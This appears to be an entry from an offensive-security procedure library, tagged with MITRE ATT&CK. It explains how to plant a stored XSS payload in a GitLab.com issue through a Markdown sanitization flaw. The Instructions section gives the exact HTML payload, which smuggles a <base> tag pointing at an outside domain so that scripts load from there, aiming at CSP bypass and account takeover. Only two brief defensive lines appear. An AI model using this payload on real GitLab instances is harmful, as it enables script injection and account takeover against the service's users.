---
tags:
  - xss
  - gitlab
  - markdown-injection
type: procedure
tools:
  - '[[tools/Browser-DevTools]]'
  - '[[tools/Apache-Web-Server]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: 419a04a9-e3c0-4012-a97f-b11c92673ee3
created_at: '2025-12-11T03:47:56.319Z'
updated_at: '2025-12-11T03:47:56.319Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Inject XSS Payload into GitLab Issue

## Summary

This procedure injects a stored XSS payload into a GitLab issue description exploiting improper sanitization in the Markdown rendering pipeline, allowing HTML injection for later execution.

## Description

The vulnerability in syntax_highlight_filter.rb permits arbitrary HTML in pre/code blocks. By injecting a <base> tag, relative resources are redirected to an attacker domain. This targets GitLab.com's CSP configuration, enabling script execution. Expected outcomes include arbitrary JS execution and potential account takeover.

## Requirements

1. Valid GitLab.com user account
2. Access to a project for creating issues
3. Attacker-controlled domain for hosting scripts

## Defense

Defensive measures and detection strategies:

- Implement strict CSP to block base tags
- Enhance Markdown sanitization to strip unsafe HTML

## Objectives

1. Store XSS payload persistently
2. Prepare for CSP bypass
3. Enable malicious script loading

## Instructions

### Step 1: Access GitLab and Create Issue

**Context**: Log in and navigate to a project to create a new issue.

Access GitLab.com with credentials and go to the issues section.

### Step 2: Inject Payload

**Context**: Enter the HTML payload into the issue description.

Execute [[commands/gitlab-xss-payload-injection]]:

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><base href=https://joaxcar.com><pre x=&#34;"><code></code></pre>
```

> This injects the base tag to redirect resources.

### Step 3: Save Issue

**Context**: Submit the issue to store the payload.

Save the issue and verify the description renders the injected HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/gitlab-xss-payload-injection]]

## Tools Used

## Tags

- xss
- gitlab
